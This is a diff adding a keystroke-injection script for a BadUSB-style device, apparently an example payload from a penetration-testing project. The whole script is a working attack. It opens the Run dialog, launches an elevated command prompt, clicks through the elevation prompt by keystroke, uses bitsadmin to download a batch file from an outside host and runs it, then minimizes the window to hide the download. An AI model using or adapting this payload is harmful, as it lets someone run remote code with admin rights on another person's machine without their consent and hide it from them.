@@ -1,0 +1,29 @@
+REM Initial 2s delay added in order to wait for the 
+REM file explorer window popup issued due to connection
+REM of a new drive. This line can be removed if the 
+REM device is operating in HID only mode
+DELAY 2000
+
+REM Open "Run" window
+GUI r 
+DELAY 500
+
+REM Open cmd with admin privileges 
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 1000
+
+REM Accept privilege elevation request
+LEFTARROW
+ENTER
+DELAY 500
+
+REM Download a batch script and run it
+REM This example downloads a simple script that echos 
+REM info if the current terminal session is running with
+REM admin privileges
+STRING bitsadmin /transfer "" https://trdo.pl/s/1 C:\1.bat & C:\1.bat
+ENTER
+
+REM Minimize the cmd window to hide the download process
+GUI DOWNARROW
